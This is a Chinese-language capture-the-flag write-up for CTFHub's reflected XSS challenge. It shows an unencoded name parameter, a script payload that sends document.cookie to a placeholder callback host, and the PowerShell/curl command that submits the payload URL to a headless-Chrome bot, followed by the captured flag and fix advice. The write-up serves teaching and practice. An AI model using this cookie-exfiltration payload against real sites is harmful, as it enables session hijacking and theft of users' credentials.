CTFHub - Web - XSS - 反射型

# CTFHub # Web # XSS # 反射型

一、题目信息

  • 题目名称：XSS Reflex（反射型 XSS）
  • 题目方向：Web - XSS - 反射型
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目目标：利用反射型 XSS 执行前端脚本，获取 Bot Cookie 中的 Flag。

二、漏洞分析

访问根路径时服务端返回 302，并跳转到 /?name=CTFHub。页面的回显位置如下：

<div>
    <h1>Hello, CTFHub
    </h1>
</div>

使用 name 参数提交测试内容后，参数值会未经 HTML 实体编码直接拼接到 <h1> 标签内，因此可以闭合当前文本节点并注入由浏览器执行的脚本。

三、解题步骤

  1. 验证反射点：访问根路径并跟随重定向，确认页面接收并回显 name 参数。 
    curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/?name=CTFHub"
  2. 验证脚本执行：提交以下 Payload，响应源码中可以看到 <script>alert(1)</script> 被原样写回页面： 
    <script>alert(1)</script>
    对应 URL 参数需要进行 URL 编码： 
    %3Cscript%3Ealert(1)%3C%2Fscript%3E
  3. 确认 Bot 提交接口：页面底部的 Send URL to Bot 功能向 /submit 发送 JSON 请求，请求格式如下： 
    POST /submit
Content-Type: application/json

{"url":"http://challenge-xxx.sandbox.ctfhub.com:10800/?name=..."}
    Bot 使用 HeadlessChrome 访问提交的 URL，Flag 保存在 Bot 当前域的 Cookie 中。仅使用 alert(document.cookie) 无法把结果带回攻击端，因此需要使用公网回调地址外带 Cookie。
  4. 构造外带 Payload：启动临时回调服务，将 document.cookie 编码后作为查询参数发送到回调地址： 
    <script>location='https://your-callback.example/?c='+encodeURIComponent(document.cookie)</script>
  5. 提交给 Bot：把包含 Payload 的完整 URL 进行参数编码，然后向 /submit 提交： 
    $payload = 'http://challenge-xxx.sandbox.ctfhub.com:10800/?name=' + [uri]::EscapeDataString("<script>location='https://your-callback.example/?c='+encodeURIComponent(document.cookie)</script>")
$body = @{ url = $payload } | ConvertTo-Json -Compress

curl.exe -X POST "http://challenge-xxx.sandbox.ctfhub.com:10800/submit" `
  -H "Content-Type: application/json" `
  --data-binary $body
    接口返回： 
    {
  "code": 0,
  "msg": "Successfully"
}
  6. 读取回调数据：Bot 成功执行脚本后，回调请求中出现经过 URL 编码的 Cookie： 
    GET /?c=flag%3Dctfhub%7B5362d16889b05693d7e41999%7D
    解码查询参数即可得到 Flag。

四、最终 Flag

ctfhub{5362d16889b05693d7e41999}

五、解题总结

  • 反射型 XSS 的入口：用户输入被服务端原样拼接到 HTML 中，且缺少输出编码，是最典型的反射型 XSS 成因。
  • 注意攻击链：当敏感数据只存在于 Bot 会话中时，需要结合 Bot 访问与外部回调完成数据外带，单纯弹窗不能取得 Flag。
  • 双层 URL 编码：Payload 首先作为 name 参数编码，随后完整 URL 再作为 JSON 中 url 字段提交，构造时应注意编码层级。
  • 修复建议：对用户输入执行上下文相关的 HTML 编码；避免将不可信数据直接拼接到 HTML 标签内容中，并结合 CSP 降低 XSS 风险。
